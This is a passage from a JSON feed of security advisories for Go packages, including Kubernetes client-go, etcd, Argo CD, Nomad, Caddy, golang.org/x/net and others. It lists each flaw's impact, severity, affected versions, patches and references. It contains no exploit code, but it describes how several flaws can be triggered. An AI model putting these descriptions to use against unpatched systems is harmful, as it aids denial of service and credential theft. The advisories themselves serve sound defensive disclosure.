"CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/client-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.19.0"}, {"fixed": "0.19.6"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/client-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.20.0-alpha.0"}, {"fixed": "0.20.0-alpha.2"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/client-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.18.0"}, {"fixed": "0.18.14"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/client-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.17.16"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8565"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/95623"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/95316"}, {"type": "WEB", "url": "https://github.com/kubernetes/client-go/commit/19875a3d5a2e0d4f51c976a9e0662de3c2c011e3"}, {"type": "WEB", "url": "https://github.com/kubernetes/client-go/commit/1b8383fc150c9b816b0072032cca75754c2734d0"}, {"type": "WEB", "url": "https://github.com/kubernetes/client-go/commit/44e1a07f2d513e375c4b6ee6e890040b47befe86"}, {"type": "WEB", "url": "https://github.com/kubernetes/client-go/commit/e8f871a2e5fadf90fc114565abc0963967f1a373"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/e99df0e5a75eb6e86123b56d53e9b7ca0fd00419"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/client-go"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-discuss/c/vm-HcrFUOCs/m/36utxAM5CwAJ"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0064"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-06T23:27:56Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-p4g4-wgrh-qrg2", "modified": "2023-10-02T13:55:51Z", "published": "2023-02-07T22:59:30Z", "aliases": ["CVE-2020-15106"], "summary": "Panic due to malformed WALs in go.etcd.io/etcd", "details": "### Vulnerability type\nData Validation\n\n### Detail\nThe size of a record is stored in the length field of a WAL file and no additional validation is done on this data. Therefore, it is possible to forge an extremely large frame size that can unintentionally panic at the expense of any RAFT participant trying to decode the WAL.\n\n### Specific Go Packages Affected\ngithub.com/etcd-io/etcd/wal\n\n### References\nFind out more on this vulnerability in the [security audit report](https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Contact the [etcd security committee](https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.0-alpha.5.0.20200423152442-f4b650b51dc4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/etcd-io/etcd/security/advisories/GHSA-p4g4-wgrh-qrg2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15106"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/pull/11793"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/commit/4571e528f49625d3de3170f219a45c3b3d38c675"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/commit/f4b650b51dc4a53a8700700dc12e1242ac56ba07"}, {"type": "PACKAGE", "url": "https://github.com/etcd-io/etcd"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0005"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-02-07T22:59:30Z", "nvd_published_at": "2020-08-05T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hjmr-xm25-36mh", "modified": "2023-02-16T21:52:55Z", "published": "2023-02-08T09:30:24Z", "aliases": ["CVE-2023-0743"], "summary": "Answer subject to Cross-site Scripting vulnerability", "details": "Cross-site Scripting (XSS) - Generic in GitHub repository answerdev/answer prior to 1.0.4.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0743"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/860b1a3bd8cfaa8827e6e6f50ab1d98fa4c2c816"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/366cf8bb-19f6-4388-b089-d0a260efd863"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-02-08T22:39:02Z", "nvd_published_at": "2023-02-08T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-87x9-7grx-m28v", "modified": "2023-02-22T00:03:49Z", "published": "2023-02-22T00:03:49Z", "aliases": ["CVE-2023-25656"], "summary": "notation-go has excessive memory allocation on verification", "details": "### Impact\n\n`notation-go` users will find their application using excessive memory when verifying signatures and the application will be finally killed, and thus availability is impacted.\n\n### Patches\n\nThe problem has been patched in the release [v1.0.0-rc.3](https://github.com/notaryproject/notation-go/releases/tag/v1.0.0-rc.3). Users should upgrade their `notation-go` packages to `v1.0.0-rc.3` or above.\n\n### Workarounds\n\nUsers can review their own trust policy file and check if the identity string contains `=#`. Meanwhile, users should only put trusted certificates in their trust stores referenced by their own trust policy files, and make sure the `authenticity` validation is set to `enforce`\n\n### Credits\n\nThe `notation-go` project would like to thank Adam Korczynski (@AdamKorcz) for responsibly disclosing this issue during a security fuzzing audit sponsored by CNCF and Shiwei Zhang (@shizhMSFT) for root cause analysis and detailed vulnerability report.\n\n### References\n\n- [Resource exhaustion attacks](https://en.wikipedia.org/wiki/Resource_exhaustion_attack)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/notaryproject/notation-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0-rc.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/notaryproject/notation-go/security/advisories/GHSA-87x9-7grx-m28v"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25656"}, {"type": "WEB", "url": "https://github.com/notaryproject/notation-go/pull/275"}, {"type": "PACKAGE", "url": "https://github.com/notaryproject/notation-go"}, {"type": "WEB", "url": "https://github.com/notaryproject/notation-go/releases/tag/v1.0.0-rc.3"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-22T00:03:49Z", "nvd_published_at": "2023-02-20T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r887-gfxh-m9rr", "modified": "2023-03-06T19:44:37Z", "published": "2023-02-08T18:07:16Z", "aliases": ["CVE-2023-25307"], "summary": "mrpack-install vulnerable to path traversal with dependency", "details": "### Impact\nImporting a malicious `.mrpack` file can cause path traversal while downloading files.\nThis can lead to scripts or config files being placed or replaced at arbitrary locations, without the user noticing.\n\n### Patches\nNo patches yet.\n\n### Workarounds\nAvoid importing `.mrpack` files from untrusted sources.\n\n### References\nhttps://docs.modrinth.com/docs/modpacks/format_definition/#files\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nothub/mrpack-install"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.16.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.16.2"}}], "references": [{"type": "WEB", "url": "https://github.com/nothub/mrpack-install/security/advisories/GHSA-r887-gfxh-m9rr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25307"}, {"type": "WEB", "url": "https://github.com/nothub/mrpack-install/commit/a1f424b6a616d2de95228781eef3b92b9769f23c"}, {"type": "PACKAGE", "url": "https://github.com/nothub/mrpack-install"}, {"type": "WEB", "url": "https://github.com/nothub/mrpack-install/releases/tag/v0.16.3"}, {"type": "WEB", "url": "https://quiltmc.org/en/blog/2023-02-04-five-installer-vulnerabilities/"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-08T18:07:16Z", "nvd_published_at": "2023-06-26T15:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w479-w22g-cffh", "modified": "2023-02-28T00:05:48Z", "published": "2023-02-17T00:30:28Z", "aliases": ["CVE-2023-0821"], "summary": "Uncontrolled Resource Consumption in Hashicorp Nomad", "details": "HashiCorp Nomad and Nomad Enterprise 1.2.15 up to 1.3.8, and 1.4.3 jobs using a maliciously compressed artifact stanza source can cause excessive disk usage. Fixed in 1.2.16, 1.3.9, and 1.4.4.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.2.15"}, {"fixed": "1.2.16"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.0"}, {"fixed": "1.3.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.4.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0821"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-05-nomad-client-vulnerable-to-decompression-bombs-in-artifact-block/50292"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-17T14:00:26Z", "nvd_published_at": "2023-02-16T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mv6w-j4xc-qpfw", "modified": "2023-06-13T23:44:12Z", "published": "2023-02-08T22:37:10Z", "aliases": ["CVE-2023-25163"], "summary": "Argo CD leaks repository credentials in user-facing error messages and in logs", "details": "### Impact\nAll versions of Argo CD starting with v2.6.0-rc1 have an output sanitization bug which leaks repository access credentials in error messages. These error messages are visible to the user, and they are logged. The error message is visible when a user attempts to create or update an Application via the Argo CD API (and therefor the UI or CLI). The user must have `applications, create` or `applications, update` RBAC access to reach the code which may produce the error.\n\nThe user is not guaranteed to be able to trigger the error message. They may attempt to spam the API with requests to trigger a rate limit error from the upstream repository. \n\nIf the user has `repositories, update` access, they may edit an existing repository to introduce a URL typo or otherwise force an error message. But if they have that level of access, they are probably intended to have access to the credentials anyway.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD version:\n\n* v2.6.1\n\n### Workarounds\n\nThe only way to completely resolve the issue is to upgrade.\n\n#### Mitigations\n\nTo mitigate the issue, make sure that your repo credentials have only least necessary privileges. For example, the credentials should not have push access, and they should not have access to more resources than what Argo CD actually needs (for example, a whole GitHub org when only one repo is needed).\n\nTo further mitigate the impact of a leaked write-capable repo credential, you could [enable commit signature verification](https://argo-cd.readthedocs.io/en/stable/user-guide/gpg-verification/#enforcing-signature-verification). Even if someone could push a malicious commit, the commit would not by synced.\n\nYou should also enforce least privileges in Argo CD RBAC. Make sure users only have `repositories, update`, `applications, update`, or `applications, create` access if they absolutely need it.\n\n### References\n\n* The problem was initially reported in a [GitHub issue](https://github.com/argoproj/argo-cd/issues/12309)\n* [Argo CD RBAC configuration documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/)\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0-rc1"}, {"fixed": "2.6.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0-rc1"}, {"fixed": "2.6.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-mv6w-j4xc-qpfw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25163"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/issues/12309"}, {"type": "WEB", "url": "https://github.com/argoproj/argo-cd/pull/12320"}, {"type": "WEB", "url": "https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1548"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-08T22:37:10Z", "nvd_published_at": "2023-02-08T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vvpx-j8f3-3w6h", "modified": "2023-03-09T21:20:44Z", "published": "2023-02-17T14:00:02Z", "aliases": ["CVE-2022-41723"], "summary": "Uncontrolled Resource Consumption", "details": "A maliciously crafted HTTP/2 stream could cause excessive CPU consumption in the HPACK decoder, sufficient to cause a denial of service from a small number of small requests.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/net"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-41723"}, {"type": "WEB", "url": "https://go.dev/cl/468135"}, {"type": "WEB", "url": "https://go.dev/cl/468295"}, {"type": "WEB", "url": "https://go.dev/issue/57855"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/V0aBFqaFs_E"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4BUK2ZIAGCULOOYDNH25JPU6JBES5NF2/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/4MA5XS5DAOJ5PKKNG5TUXKPQOFHT5VBC/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/REMHVVIBDNKSRKNOTV7EQSB7CYQWOUOU/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RGW7GE2Z32ZT47UFAQFDRQE33B7Q7LMT/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/RLBQ3A7ROLEQXQLXFDLNJ7MYPKG5GULE/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/T7N5GV4CHH6WAGX3GFMDD3COEOVCZ4RI/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XX3IMUTZKRQ73PBZM4E2JP4BKYH4C6XE/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1571"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202311-09"}, {"type": "WEB", "url": "https://vuln.go.dev/ID/GO-2023-1571.json"}, {"type": "WEB", "url": "https://www.couchbase.com/alerts/"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-17T14:00:02Z", "nvd_published_at": "2023-02-28T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qx34-47fc-vv79", "modified": "2023-02-16T21:53:07Z", "published": "2023-02-08T06:30:33Z", "aliases": ["CVE-2023-0739"], "summary": "Answer vulnerable to Race Condition", "details": "Race Condition in Switch in GitHub repository answerdev/answer prior to 1.0.4.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0739"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/1ee34b884b905d14d4db457563176b77a974b992"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/93d7fac9-50be-4624-9096-45b89fbfd4ae"}], "database_specific": {"cwe_ids": ["CWE-362", "CWE-365"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-08T22:33:00Z", "nvd_published_at": "2023-02-08T05:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hxp2-xqf3-v83h", "modified": "2023-06-13T23:50:59Z", "published": "2023-02-07T18:24:39Z", "aliases": [], "summary": "Panic during unmarshal of Hello Verify Request in github.com/pion/dtls/v2", "details": "### Impact\n\nWhen attempting to unmarshal a Server Hello request we could attempt to unmarshal into a buffer that was too small. This could result in a panic leading the program to crash.\n\nThis issue could be abused to cause a denial of service.\n\n### Workaround\n\nNone", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pion/dtls"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.5.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pion/dtls/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pion/dtls/security/advisories/GHSA-hxp2-xqf3-v83h"}, {"type": "WEB", "url": "https://github.com/pion/dtls/commit/7a14903448b70069fd9e02adf210ca23083c56d2"}, {"type": "PACKAGE", "url": "https://github.com/pion/dtls"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1535"}], "database_specific": {"cwe_ids": ["CWE-125"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-07T18:24:39Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-2h6c-j3gf-xp9r", "modified": "2023-02-10T19:52:45Z", "published": "2023-02-10T19:52:45Z", "aliases": ["CVE-2023-23626"], "summary": "IPFS go-bitfield vulnerable to DoS via malformed size arguments", "details": "### Impact\nWhen feeding untrusted user input into the size parameter of `NewBitfield` and `FromBytes` functions, an attacker can trigger `panic`s.\n\nThis happen when the `size` is a not a multiple of `8` or is negative.\nThere were already a note in the `NewBitfield` documentation:\n> ```\n> Panics if size is not a multiple of 8.\n> ````\n\nBut it incomplete and missing from `FromBytes`'s documentation.\n\nThis has been replaced by returning an `(Bitfield, error)` and returning a non nil error if the size is wrong.\n\n### Patches\n- https://github.com/ipfs/go-bitfield/commit/5e1d256fe043fc4163343ccca83862c69c52e579\n\n### Workarounds\n- Ensure `size%8 == 0 && size >= 0` yourself before calling `NewBitfield` or `FromBytes`\n\n### References\n- https://github.com/ipfs/go-unixfs/security/advisories/GHSA-q264-w97q-q778\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipfs/go-bitfield"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipfs/go-bitfield/security/advisories/GHSA-2h6c-j3gf-xp9r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-23626"}, {"type": "WEB", "url": "https://github.com/ipfs/go-bitfield/commit/5e1d256fe043fc4163343ccca83862c69c52e579"}, {"type": "PACKAGE", "url": "https://github.com/ipfs/go-bitfield"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1558"}], "database_specific": {"cwe_ids": ["CWE-1284", "CWE-754"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-10T19:52:45Z", "nvd_published_at": "2023-02-09T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2g5j-5x95-r6hr", "modified": "2023-02-06T23:16:16Z", "published": "2023-02-06T23:16:16Z", "aliases": ["CVE-2020-29529"], "summary": "Unsafe tar unpacking in HashiCorp go-slug", "details": "HashiCorp go-slug before 0.5.0 does not address attempts at directory traversal involving ../ and symlinks.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-slug"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-29529"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-slug/pull/12"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-slug/commit/28cafc59c8da6126a3ae94dfa84181df4073454f"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-slug/commit/764785bc4cbb9e600ad1cf1a6bd21b535c182983"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/go-slug"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-slug/compare/v0.4.3...v0.5.0"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-slug/releases/tag/v0.5.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0094"}, {"type": "ADVISORY", "url": "https://securitylab.github.com/advisories/GHSL-2020-262-zipslip-go-slug"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-59"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-06T23:16:16Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-4cwh-8w4g-jxxh", "modified": "2023-02-21T19:00:20Z", "published": "2023-02-08T09:30:24Z", "aliases": ["CVE-2023-0744"], "summary": "Answer contains Improper Access Control vulnerability", "details": "Improper Access Control in GitHub repository answerdev/answer prior to 1.0.4.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0744"}, {"type": "WEB", "url": "https://github.com/answerdev/answer/commit/c1fa2b13f6b547b96da60b23350bbe2b29de542d"}, {"type": "PACKAGE", "url": "https://github.com/answerdev/answer"}, {"type": "WEB", "url": "https://huntr.dev/bounties/35a0e12f-1d54-4fc0-8779-6a4949b7c434"}, {"type": "WEB", "url": "http://packetstormsecurity.com/files/171733/Answerdev-1.0.3-Account-Takeover.html"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-02-08T22:34:33Z", "nvd_published_at": "2023-02-08T08:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r2h5-3hgw-8j34", "modified": "2023-02-17T20:51:24Z", "published": "2023-02-17T20:51:24Z", "aliases": [], "summary": "User data in TPM attestation vulnerable to MITM", "details": "### Impact\nAttestation *user data* (such as the digest of the public key in an aTLS connection) was bound to the issuer's TPM, but not to its PCR state. An attacker could intercept a node initialization, initialize the node themselves, and then impersonate an uninitialized node to the validator. In practice, this meant that a CSP insider with sufficient privileges would have been able to join a node under their control to a Constellation cluster.\n\n### Patches\nThe issue has been patched in [v2.5.2](https://github.com/edgelesssys/constellation/releases/tag/v2.5.2).\n\n### Workarounds\nnone", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/edgelesssys/constellation/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.5.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.5.1"}}], "references": [{"type": "WEB", "url": "https://github.com/edgelesssys/constellation/security/advisories/GHSA-r2h5-3hgw-8j34"}, {"type": "PACKAGE", "url": "https://github.com/edgelesssys/constellation"}, {"type": "WEB", "url": "https://github.com/edgelesssys/constellation/releases/tag/v2.5.2"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-17T20:51:24Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-qpm3-vr34-h8w8", "modified": "2023-02-16T21:55:13Z", "published": "2023-02-07T00:30:24Z", "aliases": ["CVE-2022-28923"], "summary": "Open Redirect in Caddy", "details": "Caddy v2.4.6 was discovered to contain an open redirection vulnerability which allows attackers to redirect users to phishing websites via crafted URLs", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/caddyserver/caddy/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.5.0-beta.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-28923"}, {"type": "WEB", "url": "https://github.com/caddyserver/caddy/commit/78b5356f2b1945a90de1ef7f2c7669d82098edbd"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-qpm3-vr34-h8w8"}, {"type": "PACKAGE", "url": "https://github.com/caddyserver/caddy"}, {"type": "WEB", "url": "https://lednerb.de/en/publications/responsible-disclosure/caddy-open-redirect-vulnerability/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1567"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-02-15T15:35:34Z", "nvd_published_at": "2023-02-06T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p64j-r5f4-pwwx", "modified": "2023-02-06T23:38:18Z", "published": "2023-02-06T23:38:18Z", "aliases": ["CVE-2020-36067"], "summary": "Improper Validation of Array Index in GJSON", "details": "GJSON < 1.6.6 allows attackers to cause a denial of service (panic: runtime error: slice bounds out of range) via a crafted GET call.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/tidwall/gjson"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36067"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/issues/196"}, {"type": "WEB", "url": "https://github.com/tidwall/gjson/commit/bf4efcb3c18d1825b2988603dea5909140a5302b"}, {"type": "PACKAGE", "url": "https://github.com/tidwall/gjson"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0054"}], "database_specific": {"cwe_ids": ["CWE-129"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-02-06T23:38:18Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-65px-4cpf-697r", "modified": "2023-02-15T22:00:10Z", "published": "2023-02-08T09:30:24Z", "aliases": ["CVE-2023-0740"], "summary": "Cross-site scripting vulnerability found in answerdev/answer", "details": "Cross-site Scripting (XSS) - Stored in GitHub repository answerdev/answer prior to 1.0.4.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/answerdev/answer"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0740"}, {"type": 